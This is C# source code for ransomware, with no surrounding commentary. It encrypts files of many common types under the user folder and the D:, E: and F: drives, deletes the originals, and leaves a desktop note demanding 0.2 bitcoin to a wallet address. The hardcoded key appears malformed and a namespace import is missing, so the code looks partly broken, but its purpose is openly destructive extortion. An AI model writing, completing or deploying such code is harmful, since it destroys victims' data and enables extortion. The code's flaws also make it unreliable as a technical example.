using System;
using System.IO;
using System.Collections.Generic;
using System.Security.Cryptography;

static class Program
{
    [STAThread]
    static void Main(string[] args)
    {
        try
        {
            Locker.EncryptFileSystem();
            var notePath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\" + "!!! OPEN ME !!!.txt";
            var note = "Y 0 u R     F i 1 e S     R     3 n C r y P t 3 d !     M u a h a h a h a h a h a h a h ah a !!!!!!\r\n2     d 3 C r y P t    y 0 u R     F i 1 e S     P 1 e a s e     s 3 n D     .2     B i T c 0 i N   (b t C)     t o     14xMeDbjsyBCtjCLsaKBYLqw4C2Sf145o5";
            System.IO.File.WriteAllText(notePath, note);
        }
        catch
        {
        }
    }
}

internal static class Config
{
    internal const string EncryptionFileExtension = @".lol";
    internal const int MaxFilesizeToEncryptInBytes = 10000000;
    internal const string EncryptionPassword = @"QlRDPTE0eE1lRGJqc3lCQ3RqQ0xzYUtCWUxxdzRDMlNmMTQ1bzU=";
}

internal static class Locker
{
    private static readonly HashSet<string> EncryptedFiles = new HashSet<string>();

    private const string EncryptionFileExtension = Config.EncryptionFileExtension;
    private const string EncryptionPassword = Config.EncryptionPassword;

    private static HashSet<string> DirectoriesToEncrypt = new HashSet<string>()
    {
        @"C:\Users\",
        @"D:\",
        @"E:\",
        @"F:\"
    };
    
    internal static void EncryptFileSystem()
    {
        var extensionsToEncrypt = new HashSet<string>(GetExtensionsToEncrypt());

        foreach (var directory in DirectoriesToEncrypt)
        {
            EncryptFiles(directory, EncryptionFileExtension, extensionsToEncrypt);
        }

        foreach (var file in EncryptedFiles)
        {
            try
            {
                File.Delete(file);
            }
            catch
            {
            }
        }
    }

    private static IEnumerable<string> GetExtensionsToEncrypt()
    {
        var extensionsToEncrypt = new HashSet<string>();

        foreach (
            var ext in
                Resources.ExtensionsToEncrypt.Split(new[] { Environment.NewLine, " " },
                    StringSplitOptions.RemoveEmptyEntries).ToList())
        {
            extensionsToEncrypt.Add(ext.Trim());
        }

        extensionsToEncrypt.Remove(EncryptionFileExtension);

        return extensionsToEncrypt;
    }

    private static void EncryptFiles(string dirPath, string encryptionExtension, HashSet<string> extensionsToEncrypt)
    {
        foreach (var file in
            (from file in Directory.GetFiles(dirPath) from ext in extensionsToEncrypt where file.EndsWith(ext) select file)
                .Select(file => new { file, fi = new FileInfo(file) })
                .Where(@t => @t.fi.Length < 10000000)
                .Select(@t => @t.file))
        {
            try
            {
                if (EncryptFile(file, encryptionExtension))
                {
                    EncryptedFiles.Add(file);
                }
            }
            catch
            {
            }
        }
    }

    private static bool EncryptFile(string path, string encryptionExtension)
    {
        try
        {
            using (var aes = new AesCryptoServiceProvider())
            {
                aes.Key = Convert.FromBase64String(EncryptionPassword);
                aes.IV = new byte[] { 0, 1, 0, 3, 5, 3, 0, 1, 0, 0, 2, 0, 6, 7, 6, 0 };
                EncryptFile(aes, path, path + encryptionExtension);
            }
        }
        catch
        {
            return false;
        }
        return true;
    }

    private static void EncryptFile(SymmetricAlgorithm alg, string inputFile, string outputFile)
    {
        var buffer = new byte[65536];

        using (var streamIn = new FileStream(inputFile, FileMode.Open))
        using (var streamOut = new FileStream(outputFile, FileMode.Create))
        using (var encrypt = new CryptoStream(streamOut, alg.CreateEncryptor(), CryptoStreamMode.Write))
        {
            int bytesRead;
            do
            {
                bytesRead = streamIn.Read(buffer, 0, buffer.Length);
                if (bytesRead != 0)
                    encrypt.Write(buffer, 0, bytesRead);
            }
            while (bytesRead != 0);
        }
    }
}


internal class Resources
{
    internal static string ExtensionsToEncrypt
    {
        get
        {
            return ".conf .cfg .dll .exe .ps1 .vbs .sln .cpp .jpg .jpeg .raw .tif .gif .png .bmp .3dm .max .accdb .db .dbf .mdb .pdb .sql .dwg .dxf .c .cpp .cs .h .php .asp .rb .java .jar .class .py .js .aaf .aep .aepx .plb .prel .prproj .aet .ppj .psd .indd .indl .indt .indb .inx .idml .pmd .xqx .xqx .ai .eps .ps .svg .swf .fla .as3 .as .txt .doc .dot .docx .docm .dotx .dotm .docb .rtf .wpd .wps .msg .pdf .xls .xlt .xlm .xlsx .xlsm .xltx .xltm .xlsb .xla .xlam .xll .xlw .ppt .pot .pps .pptx .pptm .potx .potm .ppam .ppsx .ppsm .sldx .sldm .wav .mp3 .aif .iff .m3u .m4u .mid .mpa .wma .ra .avi .mov .mp4 .3gp .mpeg .3g2 .asf .asx .flv .mpg .wmv .vob .m3u8 .mkv .dat .csv .efx .sdf .vcf .xml .ses .rar .zip .7zip";
        }
    }

}
